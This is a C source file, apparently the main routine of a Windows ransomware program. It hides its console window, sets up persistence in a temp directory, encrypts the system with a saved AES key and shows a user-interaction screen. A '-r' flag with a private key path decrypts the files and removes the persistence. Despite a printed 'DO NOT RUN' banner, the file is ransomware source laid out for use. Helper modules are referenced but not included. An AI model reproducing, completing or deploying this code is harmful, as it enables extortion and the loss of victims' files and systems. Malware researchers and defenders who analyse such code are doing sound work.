#include <windows.h>
#include <stdio.h>

#include "MgEncryption.h"
#include "MgFile.h"
#include "MgPersistence.h"
#include "UserInteraction.h"

#define ENCRYPT_SYS 1
#define DECRYPT_SYS 0


void EncryptSystem(char* tempPath) {
	char* secretAesKey = NULL;
	if (SaveSecretKey(&secretAesKey, tempPath)) {
		ScanSystem(secretAesKey, ENCRYPT_SYS); // BOOL retValue = 
		SecurFree(secretAesKey, AES_KEY_SIZE);
	}else if (secretAesKey != NULL) {
		SecurFree(secretAesKey, AES_KEY_SIZE);
	}
}
void DecryptSystem(char* privKeyPath) {
	char* secretAesKey = NULL;
	if (GetSecretKey(&secretAesKey, privKeyPath)) {
		ScanSystem(secretAesKey, DECRYPT_SYS); // BOOL retValue = 
		SecurFree(secretAesKey, AES_KEY_SIZE);
	}else if (secretAesKey != NULL) {
		SecurFree(secretAesKey, AES_KEY_SIZE);
	}else
		printf("GetSecretKey failed ! \n");
}


int main(int argc, char *argv[]) {
	printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
	printf("!!!!!!!!!!!!!!!! DO NOT RUN !!!!!!!!!!!!!!!!\n");
	printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	//system("pause>nul");


	if (argc == 1) {
		// check if first time 
		char* tempPath = (char*)calloc(MAX_PATH + 1, 1);

		if (tempPath != NULL){
			if (GetTempPathA(MAX_PATH, tempPath) > 0) {
				const char* newDir = "Report.FCA679CF-9BFB\\";
				strcat_s(tempPath, MAX_PATH + 1, newDir);

				if (Persistence(tempPath))
					printf("[*] persistence OK\n");
				else
					printf("[X] persistence Error\n");
				EncryptSystem(tempPath);
				userInteraction();
				createCmdScript();
			}
			free(tempPath);
		}		
	}else if (argc == 3 && strcmp(argv[1], "-r") == 0) {
		printf("[!] Decrypt system\n");

		char* tempPath = (char*)calloc(MAX_PATH + 1, 1);

		if (tempPath != NULL) {
			if (GetTempPathA(MAX_PATH, tempPath) > 0) {
				DecryptSystem(argv[2]);	// arg is the path of the priv key 
				RemovePersistence(tempPath);
			}
			free(tempPath);
		}
		// recover bg 
	}else if (argc == 2 && strcmp(argv[1], "-p") == 0) {
		// after system reboot
		userInteraction();
	}else {
		userInteraction();
	}
	
	printf("[END] ");
	//system("pause");
	return 0;
}